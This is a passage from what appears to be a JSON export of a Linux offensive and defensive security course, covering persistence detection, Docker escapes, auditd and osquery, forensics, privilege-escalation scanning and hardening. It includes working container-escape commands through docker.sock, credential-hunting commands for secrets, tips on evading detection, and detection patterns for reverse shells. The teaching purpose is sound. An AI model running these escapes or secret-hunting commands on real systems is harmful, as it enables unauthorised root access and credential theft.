~/.config/systemd/user/ plus loginctl enable-linger user keeps services alive without an interactive login. Path=, Timer=, ExecStartPre= and ExecStopPost= directives in otherwise benign units. PAM modules such as pam_exec in /etc/pam.d/. /etc/ld.so.preload, ld.so.conf.d and library search path changes. initramfs hooks, udev rules, D-Bus service files, cron.d, at and profile.d. eBPF programs pinned under /sys/fs/bpf; these can outlive the process that loaded them and are invisible to ordinary file listings. Detection commands: systemctl list-unit-files --state=enabled systemctl list-timers --all systemd-analyze verify /etc/systemd/system/*.service 2>&1 find /etc/systemd /usr/lib/systemd /run/systemd -maxdepth 3 -type f -perm -111 -printf '%p\\n' 2>/dev/null grep -RIn 'pam_exec\\|ld.so.preload' /etc/pam.d /etc/ld.so.conf* /etc/ld.so.preload 2>/dev/null sudo bpftool prog list sudo bpftool net ls -la /sys/fs/bpf Integrity checks: sudo debsums -c sudo rpm -Va sudo aide --check Do not deploy these techniques outside a lab. For defensive review, focus on files that are not owned by a package, recently modified unit files, generators and PAM changes. A rootkit can hide a process, but it still needs a boot-time component or a kernel or userland hook; that is where evidence usually survives. 1 Ethics & Safety These techniques are powerful and dangerous. Use strictly in controlled labs. Always obtain authorization for any testing on real systems. References & Further Reading man systemd.unit, man systemd.service, man systemd.timer Kernel module programming guides DKMS documentation Auditd and auditctl guides for monitoring filesystem changes"},{"kind":"chapter","number":23,"order":23,"href":"chapters/23-containers-and-docker-exploitation.html","slug":"23-containers-and-docker-exploitation","page":"23-containers-and-docker-exploitation.html","title":"Containers and Docker Exploitation","short":"Containers","summary":"Enumerate containers, review mounts and capabilities, and understand escape paths.","part":"persistence","partNum":"04","partName":"Persistence and isolation","readMinutes":7,"words":922,"sections":10,"codeBlocks":9,"headings":[{"id":"objective","text":"Objective","level":2},{"id":"1-container-basics","text":"1. Container Basics","level":2},{"id":"2-enumeration-from-inside-a-container","text":"2. Enumeration from Inside a Container","level":2},{"id":"3-common-misconfigurations-and-exploits","text":"3. Common Misconfigurations & Exploits","level":2},{"id":"4-container-escape-techniques","text":"4. Container Escape Techniques","level":2},{"id":"5-lateral-movement-via-containers","text":"5. Lateral Movement via Containers","level":2},{"id":"6-detection-and-defensive-measures","text":"6. Detection & Defensive Measures","level":2},{"id":"7-practical-lab-tasks","text":"7. Practical Lab Tasks","level":2},{"id":"advanced-modern-container-and-kubernetes-attack-paths","text":"Advanced: Modern container and Kubernetes attack paths","level":2},{"id":"8-further-reading","text":"8. Further Reading","level":2}],"text":"Objective Understand container fundamentals (Docker), common misconfigurations, and how attackers abuse containers for privilege escalation and lateral movement. Includes detection and defensive advice. All commands and exploits should be tested only in authorized lab environments. 1. Container Basics Containers (Docker, Podman) isolate applications using kernel namespaces and cgroups. They are lightweight and often run as services in production. Containers share the host kernel - misconfigurations can allow container breakout and host compromise. Key Docker components: dockerd - Docker daemon (runs on host, usually as root) /var/run/docker.sock - Docker socket used to control Docker (highly privileged) Images and containers (docker images, docker ps) 2. Enumeration from Inside a Container If you get a shell inside a container, enumerate to find breakout vectors: # Basic container info cat /etc/os-release ps aux env | sort ls -la /proc/1/root # check host mount points # Check if Docker socket is mounted ls -la /var/run/docker.sock If docker.sock is accessible, you can control the Docker daemon from inside the container (host-level impact). 3. Common Misconfigurations & Exploits Mounted Docker socket (/var/run/docker.sock): Allows remote control of Docker, can create privileged containers with host mounts to read/write host filesystem. Privileged containers (--privileged): Give container almost full access to host capabilities. Host volumes mounted into containers: writable host dirs can be tampered with (e.g., /etc, /root). Containers running as root user: Process inside container runs as root UID, increasing impact if breakout occurs. Exposed Docker API without TLS: Remote daemon access allows full control. Example: abusing docker.sock to get a host shell # From container with access to docker.sock docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine chroot /host sh Another technique: start a privileged container mounting host root docker -H unix:///var/run/docker.sock run --rm -v /:/mnt --privileged alpine chroot /mnt sh 4. Container Escape Techniques Mount host FS using docker.sock (above). Kernel exploits: since containers share the host kernel, kernel vulnerabilities can escape containers (as covered in Chapter 18). Misconfigured cgroups or capabilities: containers with CAP_SYS_ADMIN can perform dangerous operations (mounting, device access). Writable /proc or kernel interfaces: abused in some escapes. 5. Lateral Movement via Containers Containers often hold secrets (API keys, mounted creds, config files). Attackers may: Read mounted config files for credentials. Connect to internal services exposed on container networks. Use image registries with leaked credentials to pull additional images. Commands to hunt credentials: grep -R \"password\" /etc /var/www 2>/dev/null cat /run/secrets/* 2>/dev/null || true 6. Detection & Defensive Measures Do not mount /var/run/docker.sock into containers. If required, use least-privilege proxies (e.g., dockerd rootless or API gateways). Avoid privileged containers; minimize capabilities (--cap-drop ALL, then add needed ones). Run containers as non-root users (USER in Dockerfile or --user flag). Restrict host mounts and use read-only mounts when necessary (:ro). Use image scanning for vulnerabilities and FIM for mounted volumes. Monitor Docker API access and audit /var/run/docker.sock usage via auditd. Network segmentation: separate container networks from critical services. Runtime detection: detect processes performing chroot, mounting fuse, or calling pivot_root from containers. 7. Practical Lab Tasks Run a local Docker container and inspect processes: docker run -it --rm alpine sh ps aux Simulate docker.sock abuse (on your lab host only): # On host, mount docker.sock into a test container docker run -it -v /var/run/docker.sock:/var/run/docker.sock --rm docker:stable-dind sh # From inside, run a privileged container mounting host docker run --rm -v /:/host --privileged alpine chroot /host sh Build an image that runs as non-root and verify user: FROM alpine RUN adduser -D appuser USER appuser CMD [\"sh\"] Scan images for known CVEs using image scanners (Trivy, Clair, etc.). Advanced: Modern container and Kubernetes attack paths Container escapes usually come from a misconfiguration, not a single kernel bug. The 2024 runc file-descriptor leak CVE-2024-21626 (\"Leaky Vessels\") allowed a malicious image or runc exec to place a process in a host directory through an inherited file descriptor; it was fixed in runc 1.1.12. Patch runc, containerd, Docker and Kubernetes node images together, then restart the runtime. Check the runtime and isolation: runc --version docker info --format '{{.ServerVersion}} {{.SecurityOptions}}' cat /proc/1/cgroup capsh --print findmnt -T / -o TARGET,SOURCE,FSTYPE,OPTIONS ls -l /var/run/docker.sock 2>/dev/null High-value misconfigurations: --privileged, CAP_SYS_ADMIN, host PID or network namespaces and mounted /dev. Docker socket mounted into a container, which is equivalent to host root in most setups. hostPath volumes that expose /, /etc, /var/lib/kubelet or the container runtime socket. Cloud metadata reachable from the pod; prefer IMDSv2 and network policies. Service account tokens automounted into pods that do not need the API. kubelet anonymous auth or read-only port exposure. Kubernetes checks: kubectl auth can-i --list kubectl get pods -A -o wide kubectl get sa -A kubectl get clusterrolebindings -o wide Runtime defense: Enforce seccomp and AppArmor or SELinux profiles; use rootless or user-namespaced runtimes where possible. Scan images with trivy image, generate SBOMs with syft and verify signatures with cosign. Use admission control to reject privileged pods, hostPath mounts and floating image tags. Deploy runtime detection with Falco, Tetragon or Tracee and forward events to a central pipeline. Treat the container runtime socket as a root-equivalent credential. Lab task: build a kind or minikube cluster, deploy a pod with a read-only root filesystem, then compare its /proc/1/cgroup, capabilities and mounts with a privileged pod. Do not attempt escapes on shared infrastructure. 8. Further Reading Docker security docs: https://docs.docker.com/engine/security/ Container breakout writeups and CVEs on Exploit-DB and GitHub Kubernetes pod escape techniques and mitigations (if Kubernetes is in scope) Ethics & Safety Only test these techniques in isolated lab environments or with explicit authorization. Container breakout on production systems is illegal and harmful."},{"kind":"chapter","number":24,"order":24,"href":"chapters/24-host-based-monitoring-auditd-and-osquery.html","slug":"24-host-based-monitoring-auditd-and-osquery","page":"24-host-based-monitoring-auditd-and-osquery.html","title":"Host-based Monitoring: auditd and osquery","short":"Host monitoring","summary":"Turn audit rules and osquery into a practical host monitoring loop.","part":"persistence","partNum":"04","partName":"Persistence and isolation","readMinutes":6,"words":779,"sections":10,"codeBlocks":7,"headings":[{"id":"objective","text":"Objective","level":2},{"id":"1-why-host-based-monitoring","text":"1. Why Host-based Monitoring?","level":2},{"id":"2-auditd-quick-start","text":"2. auditd - Quick Start","level":2},{"id":"3-osquery-quick-start","text":"3. osquery - Quick Start","level":2},{"id":"4-detection-use-cases-and-rules","text":"4. Detection Use-Cases & Rules","level":2},{"id":"5-tuning-and-performance","text":"5. Tuning & Performance","level":2},{"id":"6-practical-tasks-lab","text":"6. Practical Tasks (lab)","level":2},{"id":"7-defensive-recommendations","text":"7. Defensive Recommendations","level":2},{"id":"advanced-ebpf-runtime-security-and-detection-engineering","text":"Advanced: eBPF runtime security and detection engineering","level":2},{"id":"8-references","text":"8. References","level":2}],"text":"Objective Introduce host-based monitoring using auditd (kernel auditing) and osquery (SQL-based endpoint visibility). Learn quick deployment, common rules to watch for compromise, and basic detection use-cases. All examples are for authorized lab environments and production hardening. 1. Why Host-based Monitoring? Network logs are useful, but attackers often leave traces on the host. auditd provides kernel-level audit events (file access, execs, attrib changes). osquery gives flexible querying of system state (processes, packages, scheduled jobs) and is great for continuous monitoring and hunting. 2. auditd - Quick Start Install and enable auditd (Debian/Ubuntu): sudo apt update && sudo apt install auditd audispd-plugins -y sudo systemctl enable --now auditd Basic commands: auditctl -l # list current rules ausearch -m EXECVE # search exec events ausearch -f /etc/passwd # file access events ausearch -ts recent # recent events aureport -x # summary of executed commands Add example rules (lab/test): # Watch for changes to passwd/shadow sudo auditctl -w /etc/passwd -p wa -k passwd_changes sudo auditctl -w /etc/shadow -p wa -k shadow_changes # Log executions of su/sudo sudo auditctl -a always,exit -F arch=b64 -S execve -F path=/usr/bin/sudo -k sudo_exec Logs are in /var/log/audit/audit.log and can be forwarded to SIEM. 3. osquery - Quick Start Install osquery (packages available for many distros). Basic usage: # Interactive shell osqueryi # Example queries osqueryi \"SELECT pid, name, path, cmdline FROM processes WHERE on_disk = 0;\" osqueryi \"SELECT name, path FROM crontab WHERE user != 'root';\" osquery can run scheduled queries and return results to a central logger. 4. Detection Use-Cases & Rules Watch for new systemd unit files in or . auditd rule on /etc/systemd/system and /lib/systemd/system. Detect creation of authorized_keys or changes to ~/.ssh/authorized_keys. Alert on executions of suspicious binaries (execve events where cmdline contains bash -i or nc). Monitor unexpected network listeners: osquery query on listening_ports table. Example osquery query for listening ports: SELECT pid, address, port, process_name FROM listening_ports; 5. Tuning & Performance Keep audit rules focused to avoid performance/saturation. Use keys (-k) to filter. Use osquery packs for scheduled queries and limit frequency. Forward logs to SIEM or ELK for aggregation and alerting. 6. Practical Tasks (lab) Install auditd and add a rule to watch /etc/passwd. Check /var/log/audit/audit.log after making a test edit. Install osquery and run queries to list scheduled tasks and listening ports. Create an osquery schedule to run a query every minute and inspect results. Configure auditd to log execve events for /usr/bin/sudo and generate a report with ausearch/aureport. 7. Defensive Recommendations Centralize host logs to SIEM. Baseline outputs from osquery and alert on deviations. Use FIM alongside auditd for integrity checks. Regularly review and prune audit rules to retain signal. Advanced: eBPF runtime security and detection engineering auditd and osquery remain useful, but they are polling-based or rule-based and can be blinded by a rootkit. eBPF gives the defender programmable visibility into syscalls, process execution, network events and kernel functions with lower overhead. The same primitives are also an attack surface, so treat BPF access as privileged. Tool roles: Falco: syscall-driven rules and alerts for process, file and network behavior. Tetragon: eBPF-based process, file and network observability with enforcement options. Tracee: runtime detection and forensics from eBPF events. bpftrace: ad-hoc tracing for hypothesis-driven investigation. Cilium: eBPF networking and policy, including Kubernetes. Useful bpftrace checks: sudo bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf(\"%s -> %s\\n\", comm, str(args->filename)); }' sudo bpftrace -e 'tracepoint:syscalls:sys_enter_memfd_create { printf(\"%s created a memfd\\n\", comm); }' sudo bpftrace -e 'kprobe:__x64_sys_bpf { printf(\"%s called bpf cmd=%d\\n\", comm, arg1); }' Falco rule shape: - rule: Shell Spawned by Web Server desc: A web server process spawned an interactive shell condition: spawned_process and proc.pname in (nginx, apache2, httpd) and proc.name in (sh, bash) output: \"shell spawned by web server (user=%user.name command=%proc.cmdline parent=%proc.pname)\" priority: WARNING Detection priorities: execve from a web server, database or container entrypoint. memfd_create followed by fexecve, a common fileless execution pattern. ptrace, process_vm_readv and /proc/*/mem access against sensitive processes. bpf syscalls from unexpected processes, and new pinned programs in /sys/fs/bpf. setuid, capset, unshare, nsenter and mount operations from non-admin processes. Engineering notes: Baseline normal behavior first; a noisy rule that nobody reads is worse than no rule. Map detections to MITRE ATT&CK and include the process tree, user, container and command line. Forward events with OpenTelemetry, Vector or Fluent Bit; keep raw events for investigation. Test with bpftrace before writing a permanent Falco or Tetragon rule. Remember that eBPF requires a modern kernel, BTF and privileges; it is not available in every restricted container. 8. References man auditctl, man ausearch, osquery docs and packs. Deploy guides for production auditd and osquery fleet management (FleetDM). Ethics & Safety: Use these tools on systems you control or are authorized to monitor."},{"kind":"chapter","number":25,"order":25,"href":"chapters/25-linux-forensics-and-incident-response.html","slug":"25-linux-forensics-and-incident-response","page":"25-linux-forensics-and-incident-response.html","title":"Linux Forensics and Incident Response Basics","short":"Forensics and IR","summary":"Collect volatile data, preserve evidence and build a defensible timeline.","part":"defense","partNum":"05","partName":"Defense and workflow","readMinutes":5,"words":688,"sections":12,"codeBlocks":5,"headings":[{"id":"objective","text":"Objective","level":2},{"id":"1-triage-preserve-evidence-first","text":"1. Triage: Preserve Evidence First","level":2},{"id":"2-volatile-data-collection-memory-and-network","text":"2. Volatile Data Collection (memory & network)","level":2},{"id":"3-key-artifacts-to-collect","text":"3. Key Artifacts to Collect","level":2},{"id":"4-timeline-building-file-and-event-times","text":"4. Timeline Building (file and event times)","level":2},{"id":"5-suspicious-indicators-to-look-for","text":"5. Suspicious Indicators to Look For","level":2},{"id":"6-hashing-and-evidence-integrity","text":"6. Hashing & Evidence Integrity","level":2},{"id":"7-quick-analysis-tips","text":"7. Quick Analysis Tips","level":2},{"id":"8-containment-and-remediation-short-term","text":"8. Containment & Remediation (short-term)","level":2},{"id":"9-reporting-and-handover","text":"9. Reporting & Handover","level":2},{"id":"advanced-modern-dfir-and-memory-acquisition","text":"Advanced: Modern DFIR and memory acquisition","level":2},{"id":"1-further-reading-and-tools","text":"1 Further Reading & Tools","level":2}],"text":"Objective Introduce practical Linux forensics and incident response (IR) techniques that are useful immediately after a suspected compromise. Focus is on safe evidence collection, key artifacts, triage commands, and basic analysis. Use only in authorized contexts. 1. Triage: Preserve Evidence First Don't reboot the system unless absolutely necessary - volatile evidence (memory, ephemeral network connections) will be lost. If you must interact, work from a separate admin host and use remote read-only commands where possible. Create a timeline: note detection time, user actions, and commands run during triage. 2. Volatile Data Collection (memory & network) # Capture running processes and network connections ps aux > /tmp/ir_ps.txt ss -tunap > /tmp/ir_ss.txt # Dump open files and sockets lsof -nP > /tmp/ir_lsof.txt # Capture running kernel messages dmesg > /tmp/ir_dmesg.txt For memory captures, use avml, lime, or volatility tools in a lab; avoid pulling large memory dumps unless required and done safely. 3. Key Artifacts to Collect /var/log/auth.log, /var/log/syslog, journalctl output User histories: ~/.bash_history, ~/.sh_history (may be overwritten) Crontabs: /etc/crontab, /etc/cron.d/*, crontab -l -u \u003cuser> SSH keys and ~/.ssh/authorized_keys SUID/SGID binaries: find / -perm -4000 -o -perm -2000 2>/dev/null Recently modified files: find / -mtime -7 -type f 2>/dev/null 4. Timeline Building (file and event times) Use stat and journalctl to map events to absolute times: stat /path/to/suspicious_file journalctl --since \"2025-10-01\" --until \"2025-10-07\" Convert all times to UTC in your notes to avoid timezone confusion. 5. Suspicious Indicators to Look For New user accounts or unexpected sudo entries (cat /etc/sudoers and sudo -l for affected users) New systemd units or timers (ls /etc/systemd/system, systemctl list-timers --all) Unexpected listening ports or reverse shells (ss -tunap, ps aux | grep -E \"bash|python|perl|nc\") Modified binaries or tampered logs (check file hashes against known-good copies) 6. Hashing & Evidence Integrity Create cryptographic hashes of collected artifacts and store them in a secure location: sha256sum /tmp/ir_ps.txt > /tmp/ir_ps.txt.sha256 sha256sum /var/log/auth.log > /tmp/auth.log.sha256 Record who collected evidence, date/time, and chain-of-custody notes. 7. Quick Analysis Tips Grep for suspicious strings: IPs, domains, bash -i, netcat, or base64 payloads. Use strings on suspicious binaries and file to detect architecture. Use git or diff to compare configuration directories vs backups. 8. Containment & Remediation (short-term) Isolate the host from networks (airgap or VLAN) while preserving evidence. Change credentials in upstream services if lateral movement suspected. Apply temporary firewall rules (iptables/ufw) to block C2 IPs while investigating. 9. Reporting & Handover Produce a concise incident report: timeline, artifacts collected (with hashes), actions taken, and recommended remediation. Handover evidence and notes to SOC or IR team for deeper analysis. Advanced: Modern DFIR and memory acquisition Evidence collection has moved toward memory-first triage, remote acquisition and timeline automation. A disk-only workflow is too slow and too easy to corrupt on live systems. Memory acquisition: sudo avml /evidence/memory.raw sudo dc3dd if=/dev/sda of=/evidence/disk.dd hash=sha256 log=/evidence/dc3dd.log sha256sum /evidence/memory.raw /evidence/disk.dd | tee /evidence/hashes.txt Analysis: vol -f /evidence/memory.raw linux.pslist vol -f /evidence/memory.raw linux.bash vol -f /evidence/memory.raw linux.malfind log2timeline.py --storage-file /evidence/timeline.plaso /evidence/disk.dd psort.py -o /evidence/timeline.csv /evidence/timeline.plaso Modern tooling: Volatility 3 for memory forensics; symbols are fetched by kernel version, so preserve the exact kernel and modules. Velociraptor for remote triage and artifact collection at fleet scale. Plaso/log2timeline and Timesketch for timeline exploration. Zeek and Suricata for network evidence; tcpdump for packet-level proof. YARA for file and memory pattern matching; capstone for disassembly. Live response order: Capture volatile memory and network state before rebooting. Record date -u, uname -a, ps auxf, ss -tanp, lsof -nP, mount table and logged-in users. Hash every artifact and record the collector, time and command line. Isolate the host at the network layer, not by deleting files. Preserve logs before rotating or truncating them. Lab task: acquire a VM memory image with AVML, list processes and bash history in Volatility 3, and build a CSV timeline from a disk image. Verify each hash before and after analysis. 1 Further Reading & Tools Volatility/Volatility3, AVML, LiME (memory capture) GRR Rapid Response, OSQuery for endpoint telemetry The SANS DFIR resources and incident response playbooks Ethics & Safety: Only perform IR on systems you own or are authorized to analyze. Unauthorized access or evidence collection is illegal."},{"kind":"chapter","number":26,"order":26,"href":"chapters/26-automating-linux-privilege-escalation-checks.html","slug":"26-automating-linux-privilege-escalation-checks","page":"26-automating-linux-privilege-escalation-checks.html","title":"Automating Linux Privilege Escalation Checks","short":"Privilege automation","summary":"Use LinPEAS, LSE and custom checks to reproduce a repeatable enumeration pass.","part":"defense","partNum":"05","partName":"Defense and workflow","readMinutes":8,"words":1075,"sections":14,"codeBlocks":9,"headings":[{"id":"objective","text":"Objective","level":2},{"id":"1-why-automate-privilege-escalation","text":"1. Why Automate Privilege Escalation?","level":2},{"id":"2-key-tools","text":"2. Key Tools","level":2},{"id":"linpeas","text":"LinPEAS","level":3},{"id":"linux-smart-enumeration-lse","text":"Linux Smart Enumeration (LSE)","level":3},{"id":"3-writing-your-own-automation-script","text":"3. Writing Your Own Automation Script","level":2},{"id":"4-useful-one-liners","text":"4. Useful One-Liners","level":2},{"id":"5-privilege-escalation-targets","text":"5. Privilege Escalation Targets","level":2},{"id":"advanced-what-scanners-miss","text":"Advanced: What scanners miss","level":2},{"id":"privilege-escalation-field-checklist","text":"Privilege escalation field checklist","level":2},{"id":"validate-the-lead","text":"Validate the lead","level":3},{"id":"external-field-notes","text":"External field notes","level":3},{"id":"6-best-practices","text":"6. Best Practices","level":2},{"id":"7-challenge-lab-task","text":"7. Challenge (Lab Task)","level":2}],"text":"Objective Learn how to automate privilege escalation checks on Linux using scripts and well-known tools like linpeas, lse, and custom Bash one-liners. Focus on collecting misconfigurations efficiently and safely during post-exploitation or pentesting. 1. Why Automate Privilege Escalation? Manual enumeration is time-consuming. Automated scripts speed up information gathering by listing misconfigurations, weak permissions, and exploitable binaries. However, always review script outputs manually before attempting exploitation. 2. Key Tools LinPEAS LinPEAS is a popular script for privilege escalation checks. wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh chmod +x linpeas.sh ./linpeas.sh It checks for: SUID/SGID binaries Writable /etc/passwd Crontabs and PATH hijacks Capabilities, Docker, NFS, and kernel exploits Linux Smart Enumeration (LSE) A modular and cleaner enumeration tool: wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh chmod +x lse.sh ./lse.sh -l2 LSE provides detailed but safe enumeration without exploit attempts. 3. Writing Your Own Automation Script You can build your own script combining simple commands: #!/bin/bash echo \"[*] User info:\" id echo \"[*] Sudo permissions:\" sudo -l echo \"[*] SUID binaries:\" find / -perm -4000 2>/dev/null echo \"[*] Writable /etc files:\" find /etc -writable 2>/dev/null Save as enum.sh and run with: bash enum.sh > results.txt 4. Useful One-Liners find / -type f -perm -4000 2>/dev/null # Find SUID binaries sudo -l # Check sudo permissions cat /etc/passwd | grep sh$ # Users with shell access getcap -r / 2>/dev/null # List files with capabilities ls -la /root # Try if root directory is accessible 5. Privilege Escalation Targets Misconfigured sudo rules (e.g., NOPASSWD) Writable scripts executed as root (cron/systemd) SUID binaries allowing command execution Files with dangerous capabilities (setcap cap_setuid+ep) Weak environment variable paths Advanced: What scanners miss Automated enumerators are good at finding known patterns and bad at understanding context. Recent privilege escalation bugs often live in trusted update or helper paths that scanners do not model. Recent examples: CVE-2025-32463: sudo before 1.9.17p1 could load /etc/nsswitch.conf from a user-controlled directory when --chroot was used, leading to root. CVE-2025-32462: a sudoers host mismatch could let listed users run commands on unintended machines. CVE-2024-48990 and CVE-2024-11003: needrestart before 3.8 could execute code as root through PYTHONPATH or unsafe library input. CVE-2021-4034 (PwnKit) in polkit's pkexec is still found on unpatched images. CVE-2023-4911 (Looney Tunables) in the glibc dynamic loader affected many distributions. Check versions and patch state: sudo -V | head -n 1 dpkg-query -W sudo needrestart policykit-1 libc6 2>/dev/null rpm -q sudo needrestart polkit glibc 2>/dev/null Manual validation: sudo -l getcap -r / 2>/dev/null capsh --print find / -xdev -perm -4000 -type f 2>/dev/null systemd-analyze security --no-pager Use pspy to watch short-lived root processes and timers that a one-shot scan misses: ./pspy64 -pf -i 1000 Workflow: Enumerate versions and patch levels, not just binaries. Map each finding to a concrete precondition check. Validate with a non-destructive proof in a snapshot. Record false positives and why they are not exploitable. Patch or remove the helper, then re-test. Do not run unknown exploit binaries on a host you do not own. A scanner finding is a hypothesis, not a compromise. Privilege escalation field checklist Use scanner output as an index, not as a conclusion. The table below covers the surfaces that most often turn a low-privileged shell into root, including areas that are easy to miss in a one-shot scan. Surface What to check Starting point sudo NOPASSWD, ALL, wildcard rules, shell escapes, env_keep sudo -l SUID and SGID writable binaries, unexpected owners, GTFOBins entries find / -xdev \\( -perm -4000 -o -perm -2000 \\) Capabilities cap_setuid, cap_setgid, cap_dac_override, cap_sys_admin, cap_sys_ptrace getcap -r / Scheduled jobs writable scripts, relative commands, wildcard expansion crontab -l, systemctl list-timers --all Writable system files passwd, shadow, sudoers, PAM, profile, ld.so.preload find /etc -xdev -writable PATH and environment writable PATH directory, LD_PRELOAD, LD_LIBRARY_PATH, PYTHONPATH, BASH_ENV, EDITOR, PAGER echo \"$PATH\", env Services writable unit or binary, root execution, unsafe ExecStart systemctl list-units --type=service NFS no_root_squash, writable exports, UID/GID mapping showmount -e \u003chost>, cat /etc/exports Containers docker group, socket mount, privileged mode, host namespaces docker info, capsh --print Kernel patch level, exposed modules, missing mitigations uname -r, sysctl kernel.kptr_restrict Two surfaces deserve extra attention. If an NFS export is writable and allows no_root_squash, root on the client can place a SUID binary that executes as root on the server. If the Docker socket or docker group is exposed, treat it as root: a privileged container can mount the host filesystem. A compact collection pass: id sudo -l sudo -V | head -n 1 getcap -r / 2>/dev/null capsh --print find / -xdev -type f \\( -perm -4000 -o -perm -2000 \\) \\ -printf '%m %u %g %p\\n' 2>/dev/null find /etc -xdev -writable -printf '%m %u %g %p\\n' 2>/dev/null printf '%s\\n' \"$PATH\" | tr ':' '\\n' crontab -l 2>/dev/null ls -la /etc/cron.* /etc/cron.d 2>/dev/null systemctl list-timers --all systemd-analyze security --no-pager findmnt -o TARGET,SOURCE,FSTYPE,OPTIONS showmount -e 127.0.0.1 2>/dev/null docker info --format '{{.ServerVersion}} {{.SecurityOptions}}' 2>/dev/null find / can be slow on large systems. Use -xdev to stay on one filesystem, and start with the directories that matter for the service you are targeting. Validate the lead Reproduce the permission or configuration with ls -l, stat, namei -l and systemctl cat. Confirm the privileged context. A writable file is only interesting if root or a privileged service reads or executes it. Check the binary's documented shell escapes on GTFOBins, then test the exact version in a lab. Use a harmless proof, such as creating a marker file. Do not leave a root shell, new account or persistence behind on a client system. Record the exact command, precondition, impact and false positives, then clean up test files and reverse configuration changes. External field notes JoramMalley's Linux privilege escalation notes are a useful topic index for the checks above: Linux-privilege-escalation. The repository is third-party material. Verify its commands and CVE claims against vendor advisories before use, and treat every technique as lab-only unless you have written authorization. 6. Best Practices Run automated tools with low noise flags to avoid detection. Redirect output to local files for review (tee, >, or 2>/dev/null). Keep your custom script modular - add functions per category (users, services, permissions). Always respect legal & ethical boundaries. 7. Challenge (Lab Task) Run linpeas.sh and lse.sh on a lab VM. Compare results - note what each finds differently. Add one of your custom checks (like world-writable configs). Report findings in a simple table format (tool → finding → impact). Ethics & Safety: Run these tools only on systems you own or are authorized to test. Unauthorized scanning or exploitation is illegal."},{"kind":"chapter","number":27,"order":27,"href":"chapters/27-linux-hardening-and-monitoring.html","slug":"27-linux-hardening-and-monitoring","page":"27-linux-hardening-and-monitoring.html","title":"Linux Hardening and Monitoring","short":"Hardening and monitoring","summary":"Reduce attack surface, capture audit events and keep a live record of activity.","part":"defense","partNum":"05","partName":"Defense and workflow","readMinutes":10,"words":765,"sections":25,"codeBlocks":29,"headings":[{"id":"objective","text":"Objective","level":2},{"id":"1-why-hardening-matters","text":"1. Why Hardening Matters","level":2},{"id":"2-install-and-enable-auditd","text":"2. Install & Enable Auditd","level":2},{"id":"3-critical-audit-rules-high-value-targets","text":"3. Critical Audit Rules (High-Value Targets)","level":2},{"id":"monitor-etc-passwd-and-etc-shadow","text":"Monitor /etc/passwd and /etc/shadow","level":3},{"id":"monitor-privilege-escalation-binaries","text":"Monitor privilege escalation binaries","level":3},{"id":"track-binary-execution","text":"Track binary execution","level":3},{"id":"detect-changes-in-perms-ownership","text":"Detect changes in perms/ownership","level":3},{"id":"4-reviewing-audit-logs","text":"4. Reviewing Audit Logs","level":2},{"id":"5-additional-hardening-steps","text":"5. Additional Hardening Steps","level":2},{"id":"disable-unnecessary-services","text":"Disable unnecessary services","level":3},{"id":"secure-ssh","text":"Secure SSH","level":3},{"id":"tighten-sudo-rules","text":"Tighten sudo rules","level":3},{"id":"kernel-protections-sysctl","text":"Kernel protections (sysctl)","level":3},{"id":"6-output-redirection-2-and","text":"6. Output Redirection (>, >>, 2>, &>)","level":2},{"id":"7-tee-command-the-hacker-s-real-time-logger","text":"7. tee Command - The Hacker’s Real-Time Logger","level":2},{"id":"8-live-monitoring-with-tail-less-f-watch-and-multitail","text":"8. Live Monitoring with tail, less +F, watch, and multitail","level":2},{"id":"9-capture-tool-output-invisibly-useful-for-ctfs-and-red-team","text":"9. Capture Tool Output Invisibly (Useful for CTFs & Red Team)","level":2},{"id":"10-scripted-logging-for-recon-tools","text":"10. Scripted Logging for Recon Tools","level":2},{"id":"11-system-activity-monitoring-for-hackers","text":"11. System Activity Monitoring for Hackers","level":2},{"id":"12-monitor-file-changes","text":"12. Monitor file changes","level":2},{"id":"13-silent-logging-for-persistence","text":"13. Silent Logging for Persistence","level":2},{"id":"advanced-modern-hardening-baseline","text":"Advanced: Modern hardening baseline","level":2},{"id":"pentester-perspective","text":"Pentester Perspective","level":2},{"id":"lab-task","text":"Lab Task","level":2}],"text":"Objective Introduce essential Linux hardening techniques and teach how to monitor critical system activity using auditd and capturing output, logging everything, and monitoring systems in real-time without breaking stealth , a powerful auditing framework for security teams, IR responders, and pentesters simulating defenders. 1. Why Hardening Matters A hardened system reduces the attack surface, limits privilege escalation paths, and provides logs that matter during investigations. Hardening is proactive defense - stopping attacks before they happen. 2. Install & Enable Auditd sudo apt install auditd audispd-plugins -y sudo systemctl enable --now auditd Check status: auditctl -s 3. Critical Audit Rules (High-Value Targets) Monitor /etc/passwd and /etc/shadow -w /etc/passwd -p wa -k passwd_changes -w /etc/shadow -p wa -k shadow_changes Monitor privilege escalation binaries -w /usr/bin/sudo -p x -k sudo_exec -w /bin/su -p x -k su_exec Track binary execution -a always,exit -F arch=b64 -S execve -k exec_log Detect changes in perms/ownership -a always,exit -F arch=b64 -S chmod,chown,fchmod,fchown -k perms_changes Reload rules: sudo augenrules --load 4. Reviewing Audit Logs ausearch -k exec_log ausearch -k passwd_changes aureport --summary aureport -x --summary These reveal: Unexpected program execution Privilege escalation attempts File modification attempts Recon or lateral movement behavior 5. Additional Hardening Steps Disable unnecessary services systemctl disable --now service_name Secure SSH Disable root login Disable passwords Use keys + fail2ban Tighten sudo rules visudo Kernel protections (sysctl) kernel.kptr_restrict=2 kernel.dmesg_restrict=1 fs.protected_symlinks=1 6. Output Redirection (>, >>, 2>, &>) Write output to a file ls -la > output.txt → Overwrites existing content. Append instead of overwrite ls -la >> output.txt Capture errors only ls /root 2> errors.log 7. tee Command - The Hacker’s Real-Time Logger tee lets you save output to a file while still seeing it on the terminal. Perfect for recon, exploit debugging, brute-force monitoring, and automation Basic usage nmap -sV target.com | tee scan.log 8. Live Monitoring with tail, less +F, watch, and multitail Watch a log in real time tail -f /var/log/auth.log Better than tail: less +F /var/log/syslog Repeated command execution watch -n 1 \"ss -tupan | grep 443\" Multi-pane log watching (install if needed) multitail /var/log/syslog /var/log/auth.log 9. Capture Tool Output Invisibly (Useful for CTFs & Red Team) Redirect everything silently: command > /dev/null 2>&1 Perfect for hiding commands during enumeration. 10. Scripted Logging for Recon Tools Example: log every subfinder run with timestamp. #!/bin/bash timestamp=$(date +\"%Y-%m-%d-%H-%M\") subfinder -d example.com | tee -a logs/subs-$timestamp.txt 11. System Activity Monitoring for Hackers Monitor processes top htop atop Monitor network iftop nethogs Monitor filesystem activity iotop These help understand if your exploit 